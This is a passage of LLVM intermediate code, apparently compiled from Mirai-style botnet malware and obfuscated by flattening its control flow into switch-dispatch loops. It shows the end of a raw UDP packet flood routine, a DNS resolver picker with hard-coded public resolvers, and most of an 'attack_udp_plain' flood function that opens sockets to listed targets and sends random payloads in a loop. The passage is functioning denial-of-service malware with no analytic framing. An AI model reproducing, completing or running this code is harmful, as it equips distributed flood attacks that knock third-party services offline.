  %375 = trunc i64 %374 to i32
  %376 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %361, i8* %363, i16 zeroext %366, i32 %375)
  %377 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %378 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %377, i32 0, i32 3
  store i16 %376, i16* %378, align 2
  %379 = load i32, i32* %24, align 4
  %380 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %381 = load i32, i32* %11, align 4
  %382 = sext i32 %381 to i64
  %383 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %380, i64 %382
  %384 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %383, i32 0, i32 0
  %385 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %384, i32 0, i32 2
  %386 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %385, i32 0, i32 0
  store i32 %379, i32* %386, align 4
  %387 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %388 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %387, i32 0, i32 1
  %389 = load i16, i16* %388, align 2
  %390 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %391 = load i32, i32* %11, align 4
  %392 = sext i32 %391 to i64
  %393 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %390, i64 %392
  %394 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %393, i32 0, i32 0
  %395 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %394, i32 0, i32 1
  store i16 %389, i16* %395, align 2
  %396 = load i32, i32* %12, align 4
  %397 = load i8*, i8** %35, align 8
  %398 = load i8, i8* %21, align 1
  %399 = zext i8 %398 to i64
  %400 = add i64 41, %399
  %401 = add i64 %400, 2
  %402 = load i32, i32* %23, align 4
  %403 = sext i32 %402 to i64
  %404 = add i64 %401, %403
  %405 = add i64 %404, 4
  %406 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %407 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %408 = load i32, i32* %11, align 4
  %409 = sext i32 %408 to i64
  %410 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %407, i64 %409
  %411 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %410, i32 0, i32 0
  %412 = bitcast %struct.sockaddr_in* %411 to %struct.sockaddr*
  store %struct.sockaddr* %412, %struct.sockaddr** %406, align 8
  %413 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %414 = load %struct.sockaddr*, %struct.sockaddr** %413, align 8
  %415 = call i64 @sendto(i32 %396, i8* %397, i64 %405, i32 16384, %struct.sockaddr* %414, i32 16)
  store i32 1133425748, i32* %switchVar
  br label %loopEnd

; <label>:416:                                    ; preds = %loopEntry
  %417 = load i32, i32* %11, align 4
  %418 = add nsw i32 %417, 1
  store i32 %418, i32* %11, align 4
  store i32 -934097023, i32* %switchVar
  br label %loopEnd

; <label>:419:                                    ; preds = %loopEntry
  %420 = call i64 @time(i64* null) #6
  %421 = load i32, i32* %25, align 4
  %422 = sext i32 %421 to i64
  %423 = icmp sgt i64 %420, %422
  %424 = select i1 %423, i32 1849957562, i32 1896812765
  store i32 %424, i32* %switchVar
  br label %loopEnd

; <label>:425:                                    ; preds = %loopEntry
  store i32 1620967329, i32* %switchVar
  br label %loopEnd

; <label>:426:                                    ; preds = %loopEntry
  store i32 1517648313, i32* %switchVar
  br label %loopEnd

; <label>:427:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %426, %425, %419, %416, %344, %338, %333, %327, %322, %316, %311, %305, %283, %277, %276, %275, %272, %257, %254, %253, %250, %240, %231, %226, %173, %169, %113, %107, %106, %103, %97, %96, %90, %89, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %.reg2mem8 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  store i32 0, i32* %2, align 4
  call void @table_unlock_val(i8 zeroext 37)
  %11 = call i8* @table_retrieve_val(i32 37, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 37)
  %13 = load i32, i32* %2, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1735496202, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar7 = load i32, i32* %switchVar
  switch i32 %switchVar7, label %switchDefault [
    i32 1735496202, label %first
    i32 -144726340, label %16
    i32 1814645244, label %30
    i32 -699894605, label %32
    i32 -1896390807, label %37
    i32 341766562, label %45
    i32 1183755073, label %50
    i32 -216222156, label %55
    i32 -517047413, label %56
    i32 1037484614, label %57
    i32 1668695254, label %58
    i32 163765620, label %63
    i32 -958072136, label %68
    i32 1516255120, label %73
    i32 -923639204, label %79
    i32 -1463792745, label %93
    i32 963798775, label %94
    i32 -429702567, label %97
    i32 1395564909, label %101
    i32 1097277831, label %104
    i32 377775044, label %105
    i32 -1951324307, label %106
    i32 -1376846583, label %NodeBlock5
    i32 1122698681, label %NodeBlock3
    i32 447738276, label %LeafBlock1
    i32 300642666, label %NodeBlock
    i32 295999473, label %LeafBlock
    i32 -870248168, label %114
    i32 -414186259, label %116
    i32 -266130628, label %118
    i32 615773378, label %120
    i32 -744564230, label %NewDefault
    i32 1236572894, label %122
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sge i32 %.reload, 0
  %15 = select i1 %14, i32 -144726340, i32 -1951324307
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %17 = load i32, i32* %2, align 4
  %18 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %19 = call i64 @read(i32 %17, i8* %18, i64 2048)
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* %3, align 4
  %21 = load i32, i32* %2, align 4
  %22 = call i32 @close(i32 %21)
  call void @table_unlock_val(i8 zeroext 38)
  %23 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %24 = load i32, i32* %3, align 4
  %25 = call i8* @table_retrieve_val(i32 38, i32* null)
  %26 = call i32 @util_stristr(i8* %23, i32 %24, i8* %25)
  store i32 %26, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 38)
  %27 = load i32, i32* %4, align 4
  %28 = icmp ne i32 %27, -1
  %29 = select i1 %28, i32 1814645244, i32 377775044
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 0, i32* %6, align 4
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %31 = load i32, i32* %4, align 4
  store i32 %31, i32* %6, align 4
  store i32 -699894605, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %6, align 4
  %34 = load i32, i32* %3, align 4
  %35 = icmp slt i32 %33, %34
  %36 = select i1 %35, i32 -1896390807, i32 -429702567
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %6, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %39
  %41 = load i8, i8* %40, align 1
  store i8 %41, i8* %10, align 1
  %42 = load i8, i8* %8, align 1
  %43 = icmp ne i8 %42, 0
  %44 = select i1 %43, i32 1668695254, i32 341766562
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 32
  %49 = select i1 %48, i32 -216222156, i32 1183755073
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8, i8* %10, align 1
  %52 = sext i8 %51 to i32
  %53 = icmp eq i32 %52, 9
  %54 = select i1 %53, i32 -216222156, i32 -517047413
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  store i32 963798775, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  store i8 1, i8* %8, align 1
  store i32 1037484614, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 1668695254, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i8, i8* %10, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp ne i32 %60, 46
  %62 = select i1 %61, i32 163765620, i32 1516255120
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i8, i8* %10, align 1
  %65 = sext i8 %64 to i32
  %66 = icmp slt i32 %65, 48
  %67 = select i1 %66, i32 -923639204, i32 -958072136
  store i32 %67, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8, i8* %10, align 1
  %70 = sext i8 %69 to i32
  %71 = icmp sgt i32 %70, 57
  %72 = select i1 %71, i32 -923639204, i32 1516255120
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %6, align 4
  %75 = load i32, i32* %3, align 4
  %76 = sub nsw i32 %75, 1
  %77 = icmp eq i32 %74, %76
  %78 = select i1 %77, i32 -923639204, i32 -1463792745
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %81 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %82 = load i32, i32* %4, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8, i8* %81, i64 %83
  %85 = load i32, i32* %6, align 4
  %86 = load i32, i32* %4, align 4
  %87 = sub nsw i32 %85, %86
  call void @util_memcpy(i8* %80, i8* %84, i32 %87)
  %88 = load i32, i32* %6, align 4
  %89 = load i32, i32* %4, align 4
  %90 = sub nsw i32 %88, %89
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %91
  store i8 0, i8* %92, align 1
  store i8 1, i8* %9, align 1
  store i32 -429702567, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 963798775, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %6, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %6, align 4
  store i32 -699894605, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  %98 = load i8, i8* %9, align 1
  %99 = icmp ne i8 %98, 0
  %100 = select i1 %99, i32 1395564909, i32 1097277831
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %103 = call i32 @inet_addr(i8* %102) #6
  store i32 %103, i32* %1, align 4
  store i32 1236572894, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  store i32 377775044, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 -1951324307, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = call i32 @rand_next()
  %108 = urem i32 %107, 4
  store i32 %108, i32* %.reg2mem8
  store i32 -1376846583, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload13 = load volatile i32, i32* %.reg2mem8
  %Pivot6 = icmp slt i32 %.reload13, 2
  %109 = select i1 %Pivot6, i32 300642666, i32 1122698681
  store i32 %109, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload10 = load volatile i32, i32* %.reg2mem8
  %Pivot4 = icmp slt i32 %.reload10, 3
  %110 = select i1 %Pivot4, i32 -266130628, i32 447738276
  store i32 %110, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload9 = load volatile i32, i32* %.reg2mem8
  %SwitchLeaf2 = icmp eq i32 %.reload9, 3
  %111 = select i1 %SwitchLeaf2, i32 615773378, i32 -744564230
  store i32 %111, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload12 = load volatile i32, i32* %.reg2mem8
  %Pivot = icmp slt i32 %.reload12, 1
  %112 = select i1 %Pivot, i32 295999473, i32 -414186259
  store i32 %112, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload11 = load volatile i32, i32* %.reg2mem8
  %SwitchLeaf = icmp eq i32 %.reload11, 0
  %113 = select i1 %SwitchLeaf, i32 -870248168, i32 -744564230
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = call i32 @htonl(i32 134744072) #7
  store i32 %115, i32* %1, align 4
  store i32 1236572894, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = call i32 @htonl(i32 1246898730) #7
  store i32 %117, i32* %1, align 4
  store i32 1236572894, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = call i32 @htonl(i32 1074151430) #7
  store i32 %119, i32* %1, align 4
  store i32 1236572894, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = call i32 @htonl(i32 67240450) #7
  store i32 %121, i32* %1, align 4
  store i32 1236572894, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 1236572894, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  %123 = load i32, i32* %1, align 4
  ret i32 %123

loopEnd:                                          ; preds = %NewDefault, %120, %118, %116, %114, %LeafBlock, %NodeBlock, %LeafBlock1, %NodeBlock3, %NodeBlock5, %106, %105, %104, %101, %97, %94, %93, %79, %73, %68, %63, %58, %57, %56, %55, %50, %45, %37, %32, %30, %16, %first, %switchDefault
  br label %loopEntry
}

declare i32 @open(i8*, i32, ...) #5

declare i64 @read(i32, i8*, i64) #5

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i8**, align 8
  %13 = alloca i32*, align 8
  %14 = alloca i16, align 2
  %15 = alloca i16, align 2
  %16 = alloca i16, align 2
  %17 = alloca i8, align 1
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %25 = alloca i8*, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  %26 = load i8, i8* %7, align 1
  %27 = zext i8 %26 to i64
  %28 = call noalias i8* @calloc(i64 %27, i64 8) #6
  %29 = bitcast i8* %28 to i8**
  store i8** %29, i8*** %12, align 8
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 4) #6
  %33 = bitcast i8* %32 to i32*
  store i32* %33, i32** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 7, i32 65535)
  %37 = trunc i32 %36 to i16
  store i16 %37, i16* %14, align 2
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 6, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 0, i32 512)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %16, align 2
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 1, i32 1)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = bitcast %struct.sockaddr_in* %18 to i8*
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 16, i32 4, i1 false)
  %51 = call i64 @time(i64* null) #6
  %52 = load i32, i32* %6, align 4
  %53 = sext i32 %52 to i64
  %54 = add nsw i64 %51, %53
  %55 = trunc i64 %54 to i32
  store i32 %55, i32* %19, align 4
  %56 = load i16, i16* %15, align 2
  %57 = zext i16 %56 to i32
  store i32 %57, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1084626753, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1084626753, label %first
    i32 -716442291, label %60
    i32 1912135687, label %63
    i32 -1255843806, label %66
    i32 1499375220, label %67
    i32 -73429783, label %73
    i32 -1141612403, label %83
    i32 195139027, label %92
    i32 -1550654185, label %101
    i32 545355170, label %109
    i32 -30602243, label %110
    i32 -141540896, label %128
    i32 -165684154, label %129
    i32 -49387356, label %139
    i32 -1271567090, label %165
    i32 73730207, label %183
    i32 -79471645, label %184
    i32 -2034459349, label %185
    i32 1790850817, label %188
    i32 119138796, label %189
    i32 676711222, label %190
    i32 1455543634, label %196
    i32 518826474, label %205
    i32 -1614086457, label %213
    i32 2065796844, label %223
    i32 -1702975898, label %226
    i32 398086232, label %232
    i32 1191901104, label %233
    i32 -685320936, label %234
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %58 = icmp eq i32 %.reload, 65535
  %59 = select i1 %58, i32 -716442291, i32 1912135687
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = call i32 @rand_next()
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %15, align 2
  store i32 -1255843806, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i16, i16* %15, align 2
  %65 = call zeroext i16 @htons(i16 zeroext %64) #7
  store i16 %65, i16* %15, align 2
  store i32 -1255843806, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 1499375220, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %11, align 4
  %69 = load i8, i8* %7, align 1
  %70 = zext i8 %69 to i32
  %71 = icmp slt i32 %68, %70
  %72 = select i1 %71, i32 -73429783, i32 1790850817
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %75 = load i8**, i8*** %12, align 8
  %76 = load i32, i32* %11, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8*, i8** %75, i64 %77
  store i8* %74, i8** %78, align 8
  %79 = load i16, i16* %14, align 2
  %80 = zext i16 %79 to i32
  %81 = icmp eq i32 %80, 65535
  %82 = select i1 %81, i32 -1141612403, i32 195139027
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  %84 = call i32 @rand_next()
  %85 = trunc i32 %84 to i16
  %86 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %87 = load i32, i32* %11, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %86, i64 %88
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %89, i32 0, i32 0
  %91 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %90, i32 0, i32 1
  store i16 %85, i16* %91, align 2
  store i32 -1550654185, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = load i16, i16* %14, align 2
  %94 = call zeroext i16 @htons(i16 zeroext %93) #7
  %95 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %96 = load i32, i32* %11, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i64 %97
  %99 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %98, i32 0, i32 0
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %99, i32 0, i32 1
  store i16 %94, i16* %100, align 2
  store i32 -1550654185, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %103 = load i32*, i32** %13, align 8
  %104 = load i32, i32* %11, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i32, i32* %103, i64 %105
  store i32 %102, i32* %106, align 4
  %107 = icmp eq i32 %102, -1
  %108 = select i1 %107, i32 545355170, i32 -30602243
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 -685320936, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %111, align 4
  %112 = load i16, i16* %15, align 2
  %113 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %112, i16* %113, align 2
  %114 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %115 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %114, i32 0, i32 0
  store i32 0, i32* %115, align 4
  %116 = load i32*, i32** %13, align 8
  %117 = load i32, i32* %11, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds i32, i32* %116, i64 %118
  %120 = load i32, i32* %119, align 4
  %121 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %122 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  store %struct.sockaddr* %122, %struct.sockaddr** %121, align 8
  %123 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %124 = load %struct.sockaddr*, %struct.sockaddr** %123, align 8
  %125 = call i32 @bind(i32 %120, %struct.sockaddr* %124, i32 16) #6
  %126 = icmp eq i32 %125, -1
  %127 = select i1 %126, i32 -141540896, i32 -165684154
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 -165684154, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %131 = load i32, i32* %11, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %130, i64 %132
  %134 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %133, i32 0, i32 2
  %135 = load i8, i8* %134, align 4
  %136 = zext i8 %135 to i32
  %137 = icmp slt i32 %136, 32
  %138 = select i1 %137, i32 -49387356, i32 -1271567090
  store i32 %138, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %141 = load i32, i32* %11, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %140, i64 %142
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %143, i32 0, i32 1
  %145 = load i32, i32* %144, align 4
  %146 = call i32 @ntohl(i32 %145) #7
  %147 = call i32 @rand_next()
  %148 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %149 = load i32, i32* %11, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %148, i64 %150
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %151, i32 0, i32 2
  %153 = load i8, i8* %152, align 4
  %154 = zext i8 %153 to i32
  %155 = lshr i32 %147, %154
  %156 = add i32 %146, %155
  %157 = call i32 @htonl(i32 %156) #7
  %158 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %159 = load i32, i32* %11, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %158, i64 %160
  %162 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i32 0, i32 0
  %163 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %162, i32 0, i32 2
  %164 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %163, i32 0, i32 0
  store i32 %157, i32* %164, align 4
  store i32 -1271567090, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  %166 = load i32*, i32** %13, align 8
  %167 = load i32, i32* %11, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds i32, i32* %166, i64 %168
  %170 = load i32, i32* %169, align 4
  %171 = bitcast %union.__CONST_SOCKADDR_ARG* %24 to %struct.sockaddr**
  %172 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %173 = load i32, i32* %11, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %172, i64 %174
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %175, i32 0, i32 0
  %177 = bitcast %struct.sockaddr_in* %176 to %struct.sockaddr*
  store %struct.sockaddr* %177, %struct.sockaddr** %171, align 8
  %178 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %24, i32 0, i32 0
  %179 = load %struct.sockaddr*, %struct.sockaddr** %178, align 8
  %180 = call i32 @connect(i32 %170, %struct.sockaddr* %179, i32 16)
  %181 = icmp eq i32 %180, -1
  %182 = select i1 %181, i32 73730207, i32 -79471645
  store i32 %182, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  store i32 -79471645, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  store i32 -2034459349, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = load i32, i32* %11, align 4
  %187 = add nsw i32 %186, 1
  store i32 %187, i32* %11, align 4
  store i32 1499375220, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  store i32 119138796, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 676711222, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i32, i32* %11, align 4
  %192 = load i8, i8* %7, align 1
  %193 = zext i8 %192 to i32
  %194 = icmp slt i32 %191, %193
  %195 = select i1 %194, i32 1455543634, i32 -1702975898
  store i32 %195, i32* %switchVar
  br label %loopEnd

; <label>:196:                                    ; preds = %loopEntry
  %197 = load i8**, i8*** %12, align 8
  %198 = load i32, i32* %11, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds i8*, i8** %197, i64 %199
  %201 = load i8*, i8** %200, align 8
  store i8* %201, i8** %25, align 8
  %202 = load i8, i8* %17, align 1
  %203 = icmp ne i8 %202, 0
  %204 = select i1 %203, i32 518826474, i32 -1614086457
  store i32 %204, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  %206 = load i8*, i8** %25, align 8
  %207 = load i16, i16* %16, align 2
  %208 = zext i16 %207 to i32
  call void @rand_alphastr(i8* %206, i32 %208)
  %209 = load i8*, i8** %25, align 8
  %210 = load i16, i16* %16, align 2
  %211 = zext i16 %210 to i64
  %212 = getelementptr inbounds i8, i8* %209, i64 %211
  store i8 0, i8* %212, align 1
  store i32 -1614086457, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %214 = load i32*, i32** %13, align 8
  %215 = load i32, i32* %11, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds i32, i32* %214, i64 %216
  %218 = load i32, i32* %217, align 4
  %219 = load i8*, i8** %25, align 8
  %220 = load i16, i16* %16, align 2
  %221 = zext i16 %220 to i64
  %222 = call i64 @send(i32 %218, i8* %219, i64 %221, i32 16384)
  store i32 2065796844, i32* %switchVar
